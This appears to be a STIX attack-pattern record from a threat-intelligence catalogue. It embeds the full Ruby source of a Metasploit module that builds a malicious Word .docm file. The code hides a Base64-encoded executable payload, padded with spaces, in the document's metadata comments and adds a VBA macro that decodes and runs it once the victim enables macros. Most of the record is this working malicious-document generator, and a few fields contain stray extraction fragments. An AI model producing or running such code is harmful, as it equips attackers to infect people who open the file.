{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c6a0c488-0b6f-4576-a497-7ec8db58c6f7",
    "created": "2024-08-14T17:05:08.4221Z",
    "modified": "2024-08-14T17:05:08.422104Z",
    "name": "\"Microsoft Office Word Malicious Macro Execution\"",
    "description": " This module injects a malicious macro into a Microsoft Office Word document (docx). The comments field in the metadata is injected with a Base64 encoded payload, which will be decoded by the macro and execute as a Windows executable.  For a successful attack, the victim is required to manually enable macro execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/office_word_macro.rb",
            "external_id": "office_word_macro.rb"
        },
        {
            "source_name": "reference",
            "url": "https://en.wikipedia.org/wiki/Macro_virus"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Microsoft Office Word Malicious Macro Execution\",\n      'Description'    => %q{\n        This module injects a malicious macro into a Microsoft Office Word document (docx). The\n        comments field in the metadata is injected with a Base64 encoded payload, which will be\n        decoded by the macro and execute as a Windows executable.\n\n        For a successful attack, the victim is required to manually enable macro execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'sinn3r' # Metasploit\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://en.wikipedia.org/wiki/Macro_virus']\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n          'DisablePayloadHandler' => true\n        },\n      'Targets'        =>\n        [\n          [\n            'Microsoft Office Word on Windows',\n            {\n              'Platform' => 'win',\n            }\n          ],\n          [\n            'Microsoft Office Word on Mac OS X (Python)',\n            {\n              'Platform' => 'python',\n              'Arch' => ARCH_PYTHON\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-01-10'\n    ))\n\n    register_options([\n      OptPath.new(\"CUSTOMTEMPLATE\", [false, 'A docx file that will be used as a template to build the exploit']),\n      OptString.new('FILENAME', [true, 'The Office document macro file (docm)', 'msf.docm'])\n    ])\n  end\n\n  def get_file_in_docx(fname)\n    i = @docx.find_index { |item| item[:fname] == fname }\n\n    unless i\n      fail_with(Failure::NotFound, \"This template cannot be used because it is missing: #{fname}\")\n    end\n\n    @docx.fetch(i)[:data]\n  end\n\n  def add_content_type_extension(extension, content_type)\n    if has_content_type_extension?(extension)\n      update_content_type(\"Types//Default[@Extension=\\\"#{extension}\\\"]\", 'ContentType', content_type)\n    else\n      xml = get_file_in_docx('[Content_Types].xml')\n      types_node = xml.at('Types')\n\n      unless types_node\n        fail_with(Failure::NotFound, '[Content_Types].xml is missing the Types node.')\n      end\n\n      child_data = \"<Default Extension=\\\"#{extension}\\\" ContentType=\\\"#{content_type}\\\"/>\"\n      types_node.add_child(child_data)\n    end\n  end\n\n  def has_content_type_extension?(extension)\n    xml = get_file_in_docx('[Content_Types].xml')\n    xml.at(\"Types//Default[@Extension=\\\"#{extension}\\\"]\") ? true : false\n  end\n\n  def add_content_type_partname(part_name, content_type)\n    ctype_xml = get_file_in_docx('[Content_Types].xml')\n    types_node = ctype_xml.at('Types')\n\n    unless types_node\n      fail_with(Failure::NotFound, '[Content_Types].xml is missing the Types node.')\n    end\n\n    child_data = \"<Override PartName=\\\"#{part_name}\\\" ContentType=\\\"#{content_type}\\\"/>\"\n    types_node.add_child(child_data)\n  end\n\n  def update_content_type(pattern, attribute, new_value)\n    ctype_xml = get_file_in_docx('[Content_Types].xml')\n    doc_xml_ctype_node = ctype_xml.at(pattern)\n    if doc_xml_ctype_node\n      doc_xml_ctype_node.attributes[attribute].value = new_value\n    end\n  end\n\n  def add_rels_relationship(type, target)\n    rels_xml = get_file_in_docx('_rels/.rels')\n    relationships_node = rels_xml.at('Relationships')\n\n    unless relationships_node\n      fail_with(Failure::NotFound, '_rels/.rels is missing the Relationships node')\n    end\n\n    last_index = get_last_relationship_index_from_rels\n    relationships_node.add_child(\"<Relationship Id=\\\"rId#{last_index+1}\\\" Type=\\\"#{type}\\\" Target=\\\"#{target}\\\"/>\")\n  end\n\n  def add_doc_relationship(type, target)\n    rels_xml = get_file_in_docx('word/_rels/document.xml.rels')\n    relationships_node = rels_xml.at('Relationships')\n\n    unless relationships_node\n      fail_with(Failure::NotFound, 'word/_rels/document.xml.rels is missing the Relationships node.')\n    end\n\n    last_index = get_last_relationship_index_from_doc_rels\n    relationships_node.add_child(\"<Relationship Id=\\\"rId#{last_index+1}\\\" Type=\\\"#{type}\\\" Target=\\\"#{target}\\\"/>\")\n  end\n\n  def get_last_relationship_index_from_rels\n    rels_xml = get_file_in_docx('_rels/.rels')\n    relationships_node = rels_xml.at('Relationships')\n\n    unless relationships_node\n      fail_with(Failure::NotFound, '_rels/.rels is missing the Relationships node')\n    end\n\n    relationships_node.search('Relationship').collect { |n|\n      n.attributes['Id'].value.scan(/(\\d+)/).flatten.first.to_i\n    }.max\n  end\n\n  def get_last_relationship_index_from_doc_rels\n    rels_xml = get_file_in_docx('word/_rels/document.xml.rels')\n    relationships_node = rels_xml.at('Relationships')\n\n    unless relationships_node\n      fail_with(Failure::NotFound, 'word/_rels/document.xml.rels is missing the Relationships node')\n    end\n\n    relationships_node.search('Relationship').collect { |n|\n      n.attributes['Id'].value.scan(/(\\d+)/).flatten.first.to_i\n    }.max\n  end\n\n  def inject_macro\n    add_content_type_extension('bin', 'application/vnd.ms-office.vbaProject')\n    add_content_type_partname('/word/vbaData.xml', 'application/vnd.ms-word.vbaData+xml')\n\n    pattern = 'Override[@PartName=\"/word/document.xml\"]'\n    attribute_name = 'ContentType'\n    scheme = 'application/vnd.ms-word.document.macroEnabled.main+xml'\n    update_content_type(pattern, attribute_name, scheme)\n\n    scheme = 'http://schemas.microsoft.com/office/2006/relationships/vbaProject'\n    fname = 'vbaProject.bin'\n    add_doc_relationship(scheme, fname)\n\n    @docx << { fname: 'word/vbaData.xml', data: get_vbadata_xml }\n    @docx << { fname: 'word/_rels/vbaProject.bin.rels', data: get_vbaproject_bin_rels}\n    @docx << { fname: 'word/vbaProject.bin', data: get_vbaproject_bin}\n  end\n\n  def get_vbadata_xml\n    File.read(File.join(macro_resource_directory, 'vbaData.xml'))\n  end\n\n  def get_vbaproject_bin_rels\n    File.binread(File.join(macro_resource_directory, 'vbaProject.bin.rels'))\n  end\n\n  def get_vbaproject_bin\n    File.binread(File.join(macro_resource_directory, 'vbaProject.bin'))\n  end\n\n  def get_core_xml\n    File.read(File.join(macro_resource_directory, 'core.xml'))\n  end\n\n  def create_core_xml_file\n    add_content_type_partname('/docProps/core.xml', 'application/vnd.openxmlformats-package.core-properties+xml')\n    add_rels_relationship('http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties', 'docProps/core.xml')\n    @docx << { fname: 'docProps/core.xml', data: Nokogiri::XML(get_core_xml) }\n  end\n\n  def inject_payload\n    p  = padding = ' ' * 55\n    p << Rex::Text.encode_base64(target.name =~ /Python/i ? payload.encoded : generate_payload_exe)\n\n    begin\n      core_xml = get_file_in_docx('docProps/core.xml')\n    rescue Msf::Exploit::Failed\n    end\n\n    unless core_xml\n      print_status('Missing docProps/core.xml to inject the payload to. Using the default one.')\n      create_core_xml_file\n      core_xml = get_file_in_docx('docProps/core.xml')\n    end\n\n    description_node = core_xml.at('//cp:coreProperties//dc:description')\n    description_node.content = p\n  end\n\n  def unpack_docx(template_path)\n    doc = []\n\n    Zip::File.open(template_path) do |entries|\n      entries.each do |entry|\n        if entry.name.match(/\\.xml|\\.rels$/i)\n          content = Nokogiri::XML(entry.get_input_stream.read)\n        else\n          content = entry.get_input_stream.read\n        end\n\n        vprint_status(\"Parsing item from template: #{entry.name}\")\n\n        doc << { fname: entry.name, data: content }\n      end\n    end\n\n    doc\n  end\n\n  def pack_docm\n    @docx.each do |entry|\n      if entry[:data].kind_of?(Nokogiri::XML::Document)\n        entry[:data] = entry[:data].to_s\n      end\n    end\n\n    Msf::Util::EXE.to_zip(@docx)\n  end\n\n  def macro_resource_directory\n    @macro_resource_directory ||= File.join(Msf::Config.install_root, 'data', 'exploits', 'office_word_macro')\n  end\n\n  def get_template_path\n    if datastore['CUSTOMTEMPLATE']\n      datastore['CUSTOMTEMPLATE']\n    else\n      File.join(macro_resource_directory, 'template.docx')\n    end\n  end\n\n  def exploit\n    template_path = get_template_path\n\n    unless File.extname(template_path).match(/\\.docx$/i)\n      fail_with(Failure::BadConfig, 'Template is not a docx file.')\n    end\n\n    print_status(\"Using template: #{template_path}\")\n    @docx = unpack_docx(template_path)\n\n    print_status('Injecting payload in document comments')\n    inject_payload\n\n    print_status('Injecting macro and other required files in document')\n    inject_macro\n\n    print_status(\"Finalizing docm: #{datastore['FILENAME']}\")\n    docm = pack_docm\n    file_create(docm)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-10",
    "x_mitre_platforms": [
        "python'"
    ]
}